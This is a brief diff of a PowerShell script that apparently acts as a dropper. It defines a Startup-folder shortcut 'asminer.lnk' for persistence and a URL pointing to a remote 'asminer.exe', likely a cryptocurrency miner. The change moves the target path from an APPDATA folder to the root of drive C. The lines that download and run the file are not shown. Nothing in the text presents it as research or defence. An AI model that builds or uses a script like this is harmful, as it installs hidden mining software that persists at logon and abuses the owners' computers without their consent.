@@ -1,5 +1,6 @@
 $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\asminer.lnk")
-$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
+#$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
+$Path = "C:\"
 # URL der Datei, die heruntergeladen werden soll
 $url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"
 
